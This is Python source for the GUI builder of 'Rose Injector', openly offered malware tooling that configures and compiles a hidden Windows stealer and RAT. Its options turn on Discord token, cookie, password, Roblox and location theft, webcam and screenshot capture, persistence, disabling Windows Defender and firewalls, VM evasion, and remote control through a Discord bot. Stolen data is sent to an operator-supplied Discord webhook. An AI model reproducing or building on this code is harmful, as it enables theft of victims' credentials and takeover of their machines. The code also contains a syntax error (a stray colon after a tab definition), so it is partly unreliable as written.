import sys
import os
if sys.executable.endswith('pythonw.exe'):
    sys.stdout = open(os.devnull, 'w')
    sys.stderr = open(os.path.join(os.getenv('TEMP'), 'stderr-{}'.format(os.path.basename(sys.argv[0]))), "w")

from flaskwebgui import FlaskUI
from nicegui import ui, app
import requests

from dhooks import Webhook, Embed 
import os 
from pathlib import Path
import ctypes

import logging
import subprocess

import re
import webbrowser

from concurrent.futures import ProcessPoolExecutor
from multiprocessing import Manager, Queue

import asyncio
import time

from bs4 import BeautifulSoup
import shutil

from rich.traceback import install

pool = ProcessPoolExecutor()

logging.basicConfig(
    level=logging.DEBUG,
    filename='roselog.log',
    filemode='a',
    format='[%(filename)s:%(lineno)d] - %(asctime)s - %(levelname)s - %(message)s'
)

logger = logging.getLogger(__name__)


__title__ = 'Rose UI Builder'
__avatar__ = 'https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/components/readme/RoseWBG.png'
__version__ = '1.3'
__debugm__ = False # Change only if you are a dev 
__icon__ = "https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/components/tools/rose.png"
__devmsg__ = requests.get("https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/components/roseui/msg.txt").text.splitlines()[0].split(" - ")

data_builder = {
    "webhook_url": "",
    "build_name": "",
    "startup": False,
    "injection": False,
    "token": False,
    "cookie": False,
    "password": False,
    "malicious": False,
    "location": False,
    "roblox": False,
    "rose_rat": False,
    "rose_rat_url": "",
    "knight_rat": False,
    "knight_bot_token": "",
    "knight_channel_id": "",
    "knight_user_id": "",
    "knight_prefix": "",
    "screenshot": False,
    "ping": False,
    "fake_error": False,
    "nitro_buy": False,
    "get_admin": False,
    "disable_defender": False,
    "disable_firewalls": False,
    "vm_detect": False,
    "vm_webhook_url": "",
    "webcam": False
}

links = {
    "xpierroz_github": "https://github.com/xpierroz",
    "xpierroz_insta": "https://www.instagram.com/_p.slm/",
    "gumbobrot_github": "https://github.com/Gumbobrot",
    "suegdu_github": "https://github.com/suegdu",
    "svn_github": "https://github.com/suvan1911",
    "rose_github": "https://github.com/DamagingRose/Rose-Injector",
    "rose_discord": "https://discord.gg/gz5fUCkw8p"
}

logger.critical(f"Rose UI Builder is using version {str(__version__)}")

def open_link(key):
    webbrowser.open(links[key])


def auto_update():
    if __debugm__:
        return 
    
    _code = (
            "https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/components/roseui/v8.pyw"
    )
    
    code = requests.get(_code, timeout=10).text
    pattern = r"__version__ = '([\d\.]+)'"
    resultats = re.search(pattern, code)
    if resultats:
        version = resultats.group(1)
        if version != __version__:
            f = ctypes.windll.user32.MessageBoxW(
                0, 
                f"A new version has been detected.\nWould you like to download the new version?\nCurrent version: {str(__version__)} | New version {str(version)}",
                "Rose Injector",
                4
            )
            if f == 6:
                webbrowser.open("https://github.com/DamagingRose/Rose-Injector/archive/refs/heads/main.zip")
                os._exit(0)

def change_data(key, value):
    logger.info("change_data called with key " + key + " and value " + str(value))
    global data_builder
    data_builder[key] = value
    logger.info("data_builder: " + str(data_builder))
    return

async def _test_webhook():
    result = await test_webhook(data_builder["webhook_url"])
    if result == 0:
        ui.notify("WebHook successfuly executed!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-left")
        return 
    ui.notify("WebHook failed to execute!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")

async def test_webhook(webhook_url):
    try:
        async with Webhook.Async(webhook_url) as hook:
            embed = Embed(
                description='Webhook is Working',
                color=11795068,
                timestamp="now"
            )
            embed.set_author(name="Success", icon_url=__icon__)
            embed.set_footer(text="Rose Builder | By pierro, suegdu, Gumbobrot, svn", icon_url=__icon__)
            await hook.send(embed=embed)
        return 0
    except Exception as e:
        logger.error(f"WebHook failed to execute - Link: {webhook_url} - Error: {e}")
        return 1  

def _makebuild(q: Queue, data_builder) -> str:
    logger.info("Entered _makebuild")
    logger.info("data_builder: " + str(data_builder))
    if data_builder["webhook_url"] == "":
        ui.notify("WebHook URL is empty!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
        return
    if data_builder["vm_detect"] and data_builder["vm_webhook_url"] == "":
            ui.notify("VM Detection WebHook URL is empty!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
            return
    if data_builder["build_name"] == "":
        ui.notify("Build Name is empty!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
        return
    if data_builder["rose_rat"] and data_builder["rose_rat_url"] == "":
        ui.notify("Rose-RAT URL is empty!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
        return
    if data_builder["knight_rat"] and data_builder["knight_bot_token"] == "":
        ui.notify("Knight-RAT Bot Token is empty!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
        return
    
    if data_builder["rose_rat_url"] == "":
        data_builder["rose_rat_url"] = ".rat"
        
    if data_builder['vm_webhook_url'] == "":
        data_builder['vm_webhook_url'] = data_builder['webhook_url']

    ui.notify("Build has been started!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-left")
        
    path = f"{Path(__file__).resolve().parent}\\{data_builder['build_name']}"
        
    def create_dir():
        logger.info("Entered create_dir")
        try:       
            logger.info(f"Path in create_dir is {path}")
            os.mkdir(path)
        except Exception as e:
            logger.error(f"Error in create_dir: {e}")

    def get_files():
        try:
            cwd = os.getcwd()
            ncwd = cwd.replace('roseui', 'source')
            for file in os.listdir(ncwd):
                shutil.copy(ncwd + '\\' + file, path)
            logger.info(f'Successfully copied all files from {ncwd} to {path}')
        except Exception as e:
            logger.error(f"Error in get_files: {e}")

    def edit_config():
        try:
            logger.info("Entered edit_config")
            with open(f"{path}\\config.py","r",encoding="utf-8") as f:
                text = f.read()
                new = text.replace("WEBHOOK_URL", f"{data_builder['webhook_url']}") \
                .replace("rose_discord_rat = False", f"rose_discord_rat = {data_builder['rose_rat']}") \
                .replace("ROSE_DISCORD_RAT_SOCKET_LINK", f"{data_builder['rose_rat_url']}") \
                .replace("knight_discord_rat = False", f"knight_discord_rat = {data_builder['knight_rat']}") \
                .replace("KNIGHT_DISCORD_RAT_BOT_TOKEN", f"{data_builder['knight_bot_token']}") \
                .replace("KNIGHT_DISCORD_RAT_CHANNEL_ID", f"{data_builder['knight_channel_id']}") \
                .replace("KNIGHT_DISCORD_RAT_LISTENER_USER_ID", f"{data_builder['knight_user_id']}") \
                .replace("KNIGHT_DISCORD_RAT_PREFIX", f"{data_builder['knight_prefix']}") \
                .replace("startup = False", f"startup = {data_builder['startup']}") \
                .replace("injection = False", f"injection = {data_builder['injection']}") \
                .replace("token_stealing = False", f"token_stealing = {data_builder['token']}") \
                .replace("cookie_stealing = False", f"cookie_stealing = {data_builder['cookie']}") \
                .replace("password_stealing = False", f"password_stealing = {data_builder['password']}") \
                .replace("malicious_stealing = False", f"malicious_stealing = {data_builder['malicious']}") \
                .replace("location_stealing = False", f"location_stealing = {data_builder['location']}") \
                .replace("roblox_stealing = False", f"roblox_stealing = {data_builder['roblox']}") \
                .replace("screenshot = False", f"screenshot = {data_builder['screenshot']}") \
                .replace("discord_ping = False", f"discord_ping = {data_builder['ping']}") \
                .replace("get_admin = False", f"get_admin = {data_builder['get_admin']}") \
                .replace("disable_defender = False", f"disable_defender = {data_builder['disable_defender']}") \
                .replace("disable_firewalls = False", f"disable_firewalls = {data_builder['disable_firewalls']}") \
                .replace("fake_error = False", f"fake_error = {data_builder['fake_error']}") \
                .replace("nitro_auto_buy = False", f"nitro_auto_buy = {data_builder['nitro_buy']}") \
                .replace("vmdetection = False", f"vmdetection = {data_builder['vm_detect']}") \
                .replace("VMHOOK", f"{data_builder['vm_webhook_url']}") \
                .replace("webcam = False", f"webcam = {data_builder['webcam']}")
                 # noqa: E501
                
            with open(f"{path}\\config.py", "w", encoding="utf-8") as f:
                f.write(new)
        except Exception as e:
            logger.error(f"Error in edit_config: {e}")

    def compile():
        try:
            logger.info("Entering compile process")
            logger.info(f'Compile CMD Line: python -m PyInstaller "{path}\main.py" --noconsole --onefile')
            output_file = "rosecompile.log"
            subprocess.call(f'python -m PyInstaller "{path}\main.py" --noconsole --onefile', shell=True, stdout=open(output_file, 'w'), stderr=subprocess.STDOUT)
            logger.info(f"Output of compile process saved in rosecompile.log")
        except Exception as e:
            logger.error(f"Error in compile: {e}")

    def move_dir(): 
        logger.info("Entering move_dir")
        try:
            shutil.move("dist\\main.exe", f"{data_builder['build_name']}.exe")
            shutil.rmtree('build')
            shutil.rmtree('dist')
            shutil.rmtree(data_builder['build_name'])
            os.remove("main.spec")
        except Exception as e:
            logger.error(f"Error in move_dir: {e}")
            
    create_dir()
    q.put_nowait(0.2)
    get_files()
    q.put_nowait(0.4)
    edit_config()
    q.put_nowait(0.6)
    compile()
    q.put_nowait(0.8)
    move_dir()
    q.put_nowait(1)
    return 'Done!'

def _home():
    with ui.dialog() as dialog, ui.card():
        ui.label('If everything went good, your compiled file should be in the folder, else join our discord')
        ui.button("Open Folder", on_click=lambda: os.startfile(Path(__file__).resolve().parent))
        ui.button('Join Discord', on_click=lambda: webbrowser.open('https://discord.gg/gz5fUCkw8p'))
        ui.button('Close', on_click=dialog.close)
        
    async def start_computation():
        progressbar.visible = True
        might_take.visible = True
        loop = asyncio.get_running_loop()
        result = await loop.run_in_executor(pool, _makebuild, queue, data_builder)
        logger.info(result)
        dialog.open()
        progressbar.visible = False
        might_take.visible = False
        
    queue = Manager().Queue()
    ui.timer(0.1, callback=lambda: progressbar.set_value(queue.get() if not queue.empty() else progressbar.value))
      
      
    with ui.column():
        ui.input(
            label='WebHook URL',
            placeholder='Rose on top baby',  
            on_change=lambda e: change_data("webhook_url", e.value)
        ).props('inline color=pink-3').classes('w-full')
        ui.input(
            label='Build Name',
            placeholder='Rose on top baby',
            on_change=lambda e: change_data("build_name", e.value)
        ).props('inline color=pink-3').classes('w-full')
        
        ui.button(
            'Test WebHook',
            on_click=_test_webhook
        ).props("icon=code color=purple-11").classes('w-full')
        ui.button(
            'Build',
            on_click=start_computation
        ).props("icon=build color=pink-3").classes('w-full')
        
        progressbar = ui.linear_progress(value=0, show_value=False).props('instant-feedback rounded color=green-8 size=35px stripe')
        might_take = ui.label("At 60%, compiling might take 1 to 2 minutes depending on your computer. You can look at the progress on both .log file")
        progressbar.visible = False
        might_take.visible = False

def _functions():
    with ui.column():
        with ui.expansion('System', icon='work').classes('w-full'):
            ui.checkbox(
                'Startup',
                on_change=lambda e: change_data('startup', e.value)
            ).props('inline color=pink')
            with ui.row():
                _inj = ui.checkbox(
                    'Injector',
                    on_change=lambda e: change_data('injection', e.value)
                ).props('inline color=pink')
                ui.checkbox(
                    'Nitro Auto Buy',
                    on_change=lambda e: change_data('nitro_buy', e.value)
                ).bind_visibility_from(_inj, 'value').props('inline color=pink')  
                
            with ui.row():
                _admin = ui.checkbox('Get admin', on_change=lambda e: change_data('get_admin', e.value)).props('inline color=pink')
                ui.checkbox('Disable Windows Defender', on_change=lambda e: change_data('disable_defender', e.value)).props('inline color=black-2').bind_visibility_from(_admin, 'value').props('inline color=pink')
                ui.checkbox('Disable Windows Firewalls', on_change=lambda e: change_data('disable_firewalls', e.value)).props('inline color=black-2').bind_visibility_from(_admin, 'value').props('inline color=pink')

        with ui.expansion('Grabber', icon='work').classes('w-full'):
            with ui.row():
                with ui.column():
                    ui.checkbox('Token', on_change=lambda e: change_data('token', e.value)).props('inline color=green')
                    ui.checkbox('Cookie', on_change=lambda e: change_data('cookie', e.value)).props('inline color=green')
                    ui.checkbox('Password', on_change=lambda e: change_data('password', e.value)).props('inline color=green')
                    ui.checkbox('Screenshot', on_change=lambda e: change_data('screenshot', e.value)).props('inline color=green')
                    ui.checkbox('Webcam', on_change=lambda e: change_data('webcam', e.value)).props('inline color=green')
                    
                with ui.column():
                    ui.checkbox('Malicious', on_change=lambda e: change_data('malicious', e.value)).props('inline color=green')
                    ui.checkbox('Location', on_change=lambda e: change_data('location', e.value)).props('inline color=green')
                    ui.checkbox('Roblox', on_change=lambda e: change_data('roblox', e.value)).props('inline color=green')

        with ui.expansion('Advanced', icon='work').classes('w-full'):
            with ui.column():
                with ui.row():
                    _rose_rat = ui.checkbox('Rose-RAT', on_change=lambda e: change_data('rose_rat', e.value)).props('inline color=yellow-7')
                    ui.input(label='Rose-RAT Server URL', placeholder='Rose on top baby',
                        on_change=lambda e: change_data('rose_rat_url', e.value)).bind_visibility_from(_rose_rat, 'value').props('inline color=yellow-7')
                with ui.row():
                    _knight_rat = ui.checkbox('Knight-RAT', on_change=lambda e: change_data('knight_rat', e.value)).props('inline color=yellow-7')
                    ui.input(label='Knight-RAT Bot Token', placeholder='Knight on top baby',
                        on_change=lambda e: change_data('knight_bot_token', e.value)).bind_visibility_from(_knight_rat, 'value').props('inline color=yellow-7')
                    ui.input(label='Knight-RAT Channel ID', placeholder='Knight on top baby',
                        on_change=lambda e: change_data('knight_channel_id', e.value)).bind_visibility_from(_knight_rat, 'value').props('inline color=yellow-7')
                    ui.input(label='Knight-RAT Listener User ID', placeholder='Knight on top baby',
                        on_change=lambda e: change_data('knight_user_id', e.value)).bind_visibility_from(_knight_rat, 'value').props('inline color=yellow-7')
                    ui.input(label='Knight-RAT Command Prefix', placeholder='Knight on top baby',
                        on_change=lambda e: change_data('knight_prefix', e.value)).bind_visibility_from(_knight_rat, 'value').props('inline color=yellow-7')
                ui.checkbox('Ping', on_change=lambda e: change_data('ping', e.value)).props('inline color=yellow-7')
                ui.checkbox('Fake Error', on_change=lambda e: change_data('fake_error', e.value)).props('inline color=yellow-7')
                with ui.row():
                    _vm = ui.checkbox('VM Detect', on_change=lambda e: change_data('vm_detect', e.value)).props('inline color=yellow-7')
                    ui.input(label='VM Detection WebHook URL', placeholder='Rose on top baby',
                        on_change=lambda e: change_data('vm_webhook_url', e.value)).bind_visibility_from(_vm, 'value').props('inline color=yellow-7')


def _github():
    with ui.card():
        with ui.column():
            ui.markdown(f"<code>Message from {__devmsg__[0]}: {__devmsg__[1]}</code>")
            with ui.row():
                with ui.card_section():
                    ui.label("xpierroz").classes("text-h6")
                    ui.markdown('<em>- "GUMBO MAKE A FUCKING PR"</em>').classes("text-subtitle5")
                    with ui.row():
                        #ui.label(" ") # Because the button are so sticked together without (sex button) - xpierroz 03/24
                        ui.button(on_click=lambda: open_link("xpierroz_github")).props("round icon=code color=blue-11")
                        ui.button(on_click=lambda: open_link("xpierroz_insta")).props("round icon=star_rate color=amber-8")

                with ui.card_section():
                    ui.label("Gumbobrot").classes("text-h6")
                    ui.markdown('<em>- "buddy it\'s not my fault"</em>').classes("text-subtitle5")
                    ui.button(on_click=lambda: open_link("gumbobrot_github")).props("round icon=code color=blue-11")

            with ui.row():               
                with ui.card_section():
                    ui.label("suegdu").classes("text-h6")
                    ui.markdown('<em>- "bruh"</em>').classes("text-subtitle5")
                    ui.button(on_click=lambda: open_link("suegdu_github")).props("round icon=code color=blue-11")

                with ui.card_section():
                    ui.label("svn").classes("text-h6")
                    ui.markdown('<em>*svn died*</em>').classes("text-subtitle5")
                    ui.button(on_click=lambda: open_link("svn_github")).props("round icon=code color=blue-11")
    with ui.card():
        with ui.card_section():
            with ui.row():
                ui.label(f"Rose {__version__}").classes("text-h6")
                ui.button(on_click=lambda: open_link("rose_github")).props("round icon=code color=blue-11")
                ui.button(on_click=lambda: open_link("rose_discord")).props("round icon=unsubscribe color=indigo-12")


ui.colors(primary='#333')

@ui.page('/home')
def superhome():
    ui.image('https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/readme/RoseWBG.png').style(
        'position: absolute; top: 3px; left: 575px; width: 90px;'
        )        



    with ui.tabs().classes('w-full center') as tabs:
        ui.tab('Home', icon='home')
        ui.tab('Functions', icon='fingerprint')
        ui.tab('Socials', icon='face'):

    with ui.tab_panels(tabs, value='Home').classes('bg-transparent').classes('w-full center'):
        with ui.tab_panel('Home'):
            _home()
        with ui.tab_panel('Functions'):
            _functions()
        with ui.tab_panel('Socials'):
            _github()

v = ui.video('https://github.com/DamagingRose/Rose-Injector/raw/main/components/assets/RoseLoadingScreen.mp4', autoplay=True, loop=False, muted=True, controls=False).style('position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover;')
v.on('ended', lambda _: ui.open('/home'))
app.on_shutdown(pool.shutdown)

def start_nicegui(**kwargs):
    ui.run(
        title=__title__,
        **kwargs
    )

if __name__ in {"__main__", "__mp_main__"}:
    auto_update()
    ui.run(
        native=True,
        dark=True,
        reload=False,
        show=False,
        port=2009,
        window_size=(700, 700)
    )
